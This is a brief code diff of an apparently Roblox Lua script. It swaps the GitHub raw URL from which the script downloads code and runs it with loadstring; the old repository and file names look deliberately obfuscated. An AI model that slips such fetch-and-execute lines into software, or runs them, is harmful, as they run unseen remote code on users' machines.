@@ -41,7 +41,7 @@ request({
 
 
 local success, result = pcall(function()
-    return loadstring(game:HttpGet("https://raw.githubusercontent.com/azenbest/IIIIIIIIIIIIIIIIIIIIIIIIIIIIII/refs/heads/main/IlIIIIIIIllIllIlllIIl"))()
+    return loadstring(game:HttpGet("https://raw.githubusercontent.com/azenbest/test/refs/heads/main/main.lua"))()
 end)
 
 if not success then
